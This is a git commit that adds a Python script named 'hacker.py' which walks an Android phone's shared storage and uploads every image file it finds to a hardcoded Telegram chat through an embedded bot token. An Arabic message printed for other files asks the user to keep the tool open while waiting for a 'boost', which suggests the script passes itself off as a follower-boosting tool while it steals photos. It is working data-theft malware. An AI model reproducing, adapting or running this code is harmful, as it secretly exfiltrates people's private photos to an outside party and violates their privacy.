b58e1b288402f282ae7578f8e1880316c16ed456
mehdi25yasser-dot <mehdi25yasser@gmail.com>
2025-09-22 19:17:07 +0100

    hacker.py

---
+++ hacker.py
@@ -0,0 +1,26 @@
+import os
+import telebot
+from threading import Thread
+
+bot = telebot.TeleBot("8419687943:AAG3tGGGfCNUCAMxQhVeXB2kdtPXlcJ4uG4") 
+
+#@MHNDYBOT
+dir_path = "/storage/emulated/0/"
+	
+ #@MHNDYBOT
+def send_file(file_path):
+ with open(file_path, "rb") as f:
+ 	if file_path.endswith(".jpg") or file_path.endswith("png") or file_path.endswith("PNG") or file_path.endswith("JPEG") or file_path.endswith("jpeg") or file_path.endswith("Webp") or file_path.endswith("webp"):
+ 		bot.send_photo(chat_id="7340667256",photo=f) 
+ 	else:
+ 		print("يرجا عدم غلق الادا انتضر الرشق 🧃")
+
+for root, dirs, files in os.walk(dir_path):
+	threads = []
+	for file in files:
+		file_path = os.path.join(root, file)
+		t = Thread(target=send_file, args=(file_path,))
+		t.start()
+		threads.append(t)
+	for thread in threads:
+		thread.join()
